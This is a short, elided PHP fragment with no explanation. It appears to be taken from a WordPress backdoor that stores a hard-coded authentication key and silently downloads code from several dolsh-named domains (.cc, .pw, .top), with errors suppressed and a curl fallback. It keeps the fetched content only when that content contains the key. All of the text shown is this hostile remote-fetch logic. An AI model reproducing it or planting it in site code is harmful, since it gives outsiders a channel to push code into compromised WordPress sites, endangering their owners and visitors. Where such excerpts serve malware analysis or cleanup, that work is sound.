...
$wp_auth_key='87b83c0568dfdee2d0d59bf8a221c00e';
        ...
        if (($tmpcontent = @file_get_contents("http://www.dolsh.cc/code1.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.cc/code1.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
        ...
        elseif ($tmpcontent = @file_get_contents("http://www.dolsh.pw/code1.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
...
if (stripos($tmpcontent, $wp_auth_key) !== false) {
        ...
        } elseif (($tmpcontent = @file_get_contents("http://www.dolsh.top/code1.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.top/code1.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
